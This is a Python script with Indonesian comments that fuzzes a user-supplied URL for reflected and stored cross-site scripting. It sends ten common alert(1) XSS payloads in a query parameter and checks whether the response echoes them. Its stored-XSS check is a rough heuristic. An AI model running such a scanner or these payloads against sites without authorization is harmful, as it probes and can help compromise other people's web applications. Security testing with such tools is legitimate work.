import requests
from urllib.parse import urlparse, urljoin, urlencode
import time

# Payload XSS yang umum
payloads = [
    "<script>alert(1)</script>",
    "<img src='x' onerror='alert(1)'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math><mtext><animate onbegin=alert(1)>"
]

# Fungsi untuk memastikan URL memiliki skema yang benar
def ensure_url_has_scheme(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url  # Menambahkan https:// secara default
    return url

# Fungsi untuk mendeteksi apakah halaman mengandung XSS
def detect_xss(url, payload):
    # Encode payload dalam query parameter
    parsed_url = urlparse(url)
    payload_url = urljoin(url, parsed_url.path + '?' + urlencode({'input': payload}))

    print(f"Testing Reflected XSS with URL: {payload_url}")  # Debugging URL

    # Mengirimkan request dengan payload sebagai parameter
    try:
        response = requests.get(payload_url)
        if response.status_code == 200:
            # Parsing HTML untuk mencari indikasi XSS
            if payload in response.text:
                print(f"Potential Reflected XSS Detected at {payload_url}")
                return "Reflected XSS"
            else:
                print(f"No XSS detected in reflected form at {payload_url}.")
    except requests.exceptions.RequestException as e:
        print(f"Error with URL: {payload_url}, {e}")
    return None

# Fungsi untuk mendeteksi Stored XSS
def detect_stored_xss(url, payload):
    # Encode payload dalam query parameter
    parsed_url = urlparse(url)
    payload_url = urljoin(url, parsed_url.path + '?' + urlencode({'input': payload}))
    
    print(f"Testing Stored XSS with URL: {payload_url}")  # Debugging URL
    
    # Mengirimkan data ke server
    try:
        response = requests.get(payload_url)
        if response.status_code == 200:
            # Memberikan waktu untuk server memproses
            time.sleep(2)
            new_response = requests.get(url)
            if payload in new_response.text:
                print(f"Potential Stored XSS Detected at {url}")
                return "Stored XSS"
            else:
                print(f"No Stored XSS detected at {url}.")
    except requests.exceptions.RequestException as e:
        print(f"Error with URL: {payload_url}, {e}")
    return None

# Fungsi utama untuk menguji XSS di URL
def xss_fuzzer(url):
    # Pastikan URL yang dimasukkan memiliki skema (http:// atau https://)
    url = ensure_url_has_scheme(url)
    
    print(f"Testing URL: {url}")  # Debugging URL
    
    for payload in payloads:
        reflected_xss = detect_xss(url, payload)
        if reflected_xss:
            print(f"[+] {reflected_xss} in URL {url}")
        
        stored_xss = detect_stored_xss(url, payload)
        if stored_xss:
            print(f"[+] {stored_xss} in URL {url}")

# Mengambil input URL dari pengguna dan menghapus tanda kutip jika ada
url_input = input("Masukkan URL untuk diuji: ").strip('"')
xss_fuzzer(url_input)
